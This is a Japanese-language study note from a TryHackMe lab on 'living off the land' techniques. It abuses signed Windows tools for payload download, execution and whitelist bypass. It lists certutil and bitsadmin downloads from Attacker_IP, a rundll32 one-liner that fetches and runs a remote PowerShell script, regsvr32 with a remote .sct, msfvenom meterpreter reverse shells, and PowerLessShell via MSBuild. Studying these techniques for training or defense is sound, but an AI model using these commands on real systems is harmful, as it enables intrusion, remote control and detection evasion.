# Living Off the Land

https://tryhackme.com/r/room/livingofftheland

OS 標準のツール、または Microsoft 署名付きのツールを使って検出を回避する

## LOLBAS

https://lolbas-project.github.io/

ツールの（本来の用途とは異なる）便利な利用方法が網羅されているプロジェクト

## ファイル操作

ここでファイルダウンロードと書いているのは、ターゲットマシンにダウンロードするという意味。

### certutil

ファイルダウンロード

```ps
certutil -URLcache -split -f http://Attacker_IP/payload.exe C:\Windows\Temp\payload.exe
```

エンコード、デコード

```ps
certutil -encode payload.exe Encoded-payload.txt

certutil -decode Encoded-payload.txt payload.exe
```

### bitsadmin

ファイルダウンロード

```ps
bitsadmin.exe /transfer /Download /priority Foreground http://Attacker_IP/payload.exe c:\Users\thm\Desktop\payload.exe
```

### findstr

SMB 経由でファイルダウンロード

```ps
findstr /V dummystring \\MachineName\ShareFolder\test.exe > c:\Windows\Temp\test.exe
```

## ファイル実行

### explorer

```ps
explorer.exe /root,"C:\Windows\System32\calc.exe"
```

### wmic

```ps
wmic.exe process call create calc
```

### rundll32

```ps
rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");
```

Powershell を実行してファイルダウンロードしている

```ps
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://AttackBox_IP/script.ps1');");
```

## ホワイトリストバイパス

### regsvr32

```shell
# 32bit 版ペイロードを作ることに注意
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=443 -f dll -a x86 > live0fftheland.dll

msf6 > use exploit/multi/handler
```

```ps
c:\Windows\System32\regsvr32.exe c:\Users\thm\Downloads\live0fftheland.dll

c:\Windows\System32\regsvr32.exe /s /n /u /i:http://example.com/file.sct Downloads\live0fftheland.dll
```

- 64bit の DLL を作った場合は、C:\Windows\SysWOW64\regsvr32.exe を実行する必要がある。
- 学習環境では機能しなかったので、信頼性は疑問符。

### bash

Windows Subsystem for Linux (WSL) が有効になっている前提

```ps
bash.exe -c <p​​ath-to-payload>
```

## PowerLessShell

ps スクリプトを、Powershell の代わりに、MSBuild を使って実行する。

```shell
git clone https://github.com/Mr-Un1k0d3r/PowerLessShell.git

msfvenom -p windows/meterpreter/reverse_winhttps LHOST=AttackBox_IP LPORT=4443 -f psh-reflection > liv0ff.ps1

msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_winhttps; set lhost AttackBox_IP;set lport 4443;exploit"

# ペイロードを MSBuild ツールと互換性のあるものに変換
python2 PowerLessShell.py -type powershell -source /tmp/liv0ff.ps1 -output liv0ff.csproj
```

```shell
c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\Users\thm\Desktop\liv0ff.csproj
```
